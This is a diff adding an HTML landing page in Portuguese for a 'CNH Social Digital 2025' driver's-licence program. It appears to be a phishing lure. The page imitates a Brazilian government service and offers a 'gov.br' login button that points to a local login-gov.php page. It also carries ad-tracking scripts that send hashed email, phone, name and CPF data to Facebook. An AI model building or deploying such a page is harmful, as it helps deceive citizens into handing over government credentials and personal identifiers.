@@ -1,0 +1,369 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    
+    <script async="" src="js/fbevents.js"></script><script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+    
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CNH Social Digital 2025</title>
+     <link rel="icon" href="images/transferir3.png" type="image/png">
+
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --primary-blue: #0c377a;
+      --primary-dark-blue: #072453;
+      --button-blue: #1351b4;
+      --button-hover: #1c62d2;
+      --text-color: #303030;
+      --light-text: #ffffff;
+      --background-color: #ffffff;
+      --link-color: #1351b4;
+      --link-hover: #1c62d2;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Roboto', Arial, sans-serif;
+      background-color: var(--background-color);
+      color: var(--text-color);
+      line-height: 1.5;
+    }
+
+    .container {
+      position: relative;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+    }
+
+    .content {
+      display: flex;
+      flex: 1;
+    }
+
+    .left-content {
+      width: 50%;
+      padding: 2rem 4rem;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+    }
+
+    .right-content {
+      width: 50%;
+      overflow: hidden;
+      position: relative;
+      border-radius: 0 0 0 200px;
+    }
+
+    .logo-container {
+      margin-bottom: 1.5rem;
+    }
+
+    .logo {
+      max-width: 200px;
+    }
+
+    .title {
+      color: var(--primary-blue);
+      font-size: 2.5rem;
+      font-weight: 700;
+      margin-bottom: 0.5rem;
+    }
+
+    .subtitle {
+      color: var(--primary-blue);
+      font-size: 1.5rem;
+      font-weight: 500;
+      margin-bottom: 2rem;
+    }
+
+    .description {
+      font-size: 1.2rem;
+      color: var(--text-color);
+      margin-bottom: 2rem;
+    }
+
+    .login-btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 0.5rem;
+      background-color: var(--button-blue);
+      color: var(--light-text);
+      border: none;
+      border-radius: 25px;
+      padding: 1rem 2rem;
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+      width: fit-content;
+      max-width: 300px;
+      text-decoration: none;
+    }
+
+    .login-btn:hover {
+      background-color: var(--button-hover);
+    }
+
+    .btn-icon {
+      width: 24px;
+      height: 24px;
+      filter: brightness(0) invert(1);
+    }
+
+    .info-link {
+      margin-top: 1rem;
+      margin-bottom: 2rem;
+      color: var(--link-color);
+      text-decoration: none;
+      font-size: 1rem;
+    }
+
+    .info-link:hover {
+      text-decoration: underline;
+      color: var(--link-hover);
+    }
+
+    .additional-info {
+      margin-top: 2rem;
+      font-size: 1.1rem;
+      color: var(--primary-blue);
+      font-weight: 500;
+    }
+
+    .main-image {
+      width: 100%;
+      height: 100%;
+      object-fit: cover;
+      object-position: center;
+    }
+
+    .footer {
+      width: 100%;
+      background-color: var(--background-color);
+      display: flex;
+      flex-direction: column;
+    }
+
+    .footer-image {
+      width: 100%;
+      height: 40px;
+      object-fit: cover;
+    }
+
+    .accessibility-button {
+      position: fixed;
+      bottom: 20px;
+      right: 20px;
+      background-color: var(--button-blue);
+      width: 50px;
+      height: 50px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      cursor: pointer;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+    }
+
+    .accessibility-icon {
+      width: 24px;
+      height: 24px;
+      filter: brightness(0) invert(1);
+    }
+
+    @media (max-width: 1024px) {
+      .left-content {
+        padding: 2rem;
+      }
+      
+      .title {
+        font-size: 2rem;
+      }
+      
+      .subtitle {
+        font-size: 1.2rem;
+      }
+    }
+
+    @media (max-width: 768px) {
+      .content {
+        flex-direction: column;
+      }
+      
+      .left-content, 
+      .right-content {
+        width: 100%;
+      }
+      
+      .left-content {
+        padding: 2rem 1.5rem;
+        text-align: center;
+        align-items: center;
+      }
+      
+      .right-content {
+        display: none;
+      }
+      
+      .title {
+        font-size: 1.75rem;
+      }
+      
+      .subtitle {
+        font-size: 1.1rem;
+        margin-bottom: 1.5rem;
+      }
+      
+      .description {
+        font-size: 1rem;
+        margin-bottom: 1.5rem;
+      }
+      
+      .login-btn {
+        width: 100%;
+        max-width: 280px;
+      }
+      
+      .additional-info {
+        margin-top: 3rem;
+        font-size: 1rem;
+      }
+    }
+
+    @media (max-width: 480px) {
+      .logo {
+        max-width: 150px;
+      }
+      
+      .title {
+        font-size: 1.5rem;
+      }
+      
+      .subtitle {
+        font-size: 1rem;
+      }
+      
+      .login-btn {
+        padding: 0.8rem 1.5rem;
+        font-size: 0.9rem;
+      }
+    }
+  </style>
+    <script>
+    ! function(f, b, e, v, n, t, s) {
+      if (f.fbq) return;
+      n = f.fbq = function() {
+        n.callMethod ? n.callMethod.apply(n, arguments) : n.queue.push(arguments)
+      };
+      if (!f._fbq) f._fbq = n;
+      n.push = n;
+      n.loaded = !0;
+      n.version = '2.0';
+      n.queue = [];
+      t = b.createElement(e);
+      t.async = !0;
+      t.src = v;
+      s = b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t, s);
+    }(window, document, 'script', 'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1181092089991294');
+  </script>
+</head>
+<body>
+  <div class="container">
+    <main class="content">
+      <div class="left-content">
+        <div class="logo-container">
+          <img src="images/transferir3.png" alt="Logo CNH Social Digital" class="logo">
+        </div>
+        
+        <h1 class="title">CNH Social Digital</h1>
+        <h2 class="subtitle">2025: A Oportunidade de Realizar o Seu Sonho</h2>
+        
+        <p class="description">O primeiro programa de inclusão social para habilitação no Brasil</p>
+        
+        <a href="login-gov.php" class="login-btn">
+          <svg class="btn-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 12C14.21 12 16 10.21 16 8C16 5.79 14.21 4 12 4C9.79 4 8 5.79 8 8C8 10.21 9.79 12 12 12ZM12 14C9.33 14 4 15.34 4 18V20H20V18C20 15.34 14.67 14 12 14Z" fill="white"></path>
+          </svg>
+          <span>Entrar com o gov.br</span>
+        </a>
+        
+        <a href="#" class="info-link">Saiba o que é o programa CNH Social Digital</a>
+        
+        <div class="additional-info">
+          <p>Mais brasileiros dirigindo pelo país!</p>
+          <p>Conseguir sua CNH não é um sonho distante!</p>
+        </div>
+      </div>
+      
+      <div class="right-content">
+        <img src="images/transferir2.png" alt="Pessoas felizes com CNH Social" class="main-image">
+      </div>
+    </main>
+    
+    <footer class="footer">
+      <img src="images/transferir.png" alt="Banner decorativo" class="footer-image">
+
+    </footer>
+    
+    <div class="accessibility-button">
+      <svg class="accessibility-icon" width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C13.1 2 14 2.9 14 4C14 5.1 13.1 6 12 6C10.9 6 10 5.1 10 4C10 2.9 10.9 2 12 2ZM21 9H15V22H13V16H11V22H9V9H3V7H21V9Z" fill="white"></path>
+      </svg>
+    </div>
+  </div>
+
+  <script>
+    document.addEventListener('DOMContentLoaded', function() {
+      const accessibilityButton = document.querySelector('.accessibility-button');
+      
+      if (accessibilityButton) {
+        accessibilityButton.addEventListener('click', function() {
+          alert('Recursos de acessibilidade serão implementados em breve.');
+        });
+      }
+    });
+  </script>
+  <script src="js/latest.js" data-utmify-prevent-xcod-sck="" data-utmify-prevent-subids="" async="" defer=""></script>
+<script src="js/crypto-js.min.js"></script>
+<script>
+    fetch('pixel_data.php?event=PageView&transaction_id=abc123&cpf=123123123123')
+      .then(res => res.json())
+      .then(data => {
+        const hashUserData = u => ({
+          em: u.email ? [CryptoJS.SHA256(u.email.trim().toLowerCase()).toString(CryptoJS.enc.Hex)] : [],
+          ph: u.phone ? [CryptoJS.SHA256(u.phone).toString(CryptoJS.enc.Hex)] : [],
+          fn: u.name ? [CryptoJS.SHA256(u.name).toString(CryptoJS.enc.Hex)] : [],
+          external_id: u.cpf ? [CryptoJS.SHA256(u.cpf).toString(CryptoJS.enc.Hex)] : []
+        });
+
+        fbq('track', 'PageView', {
+          event_name: 'PageView',
+          event_time: Math.floor(Date.now() / 1000),
+          event_id: 'PageView_' + (data.order_id || Date.now()),
+          action_source: 'website',
+          user_data: hashUserData(data.user || {}),
+          custom_data: {
+            order_id: data.order_id,
+            currency: data.currency,
+            value: data.value,
+            content_name: data.content_name,
+            content_ids: data.content_ids,
+            contents: data.contents,
+            num_items: data.num_items
+          }
+        });
+      })
+      .catch(err => console.error('Erro no fetch do Pixel:', err));
+  </script>
+
+</body></html>
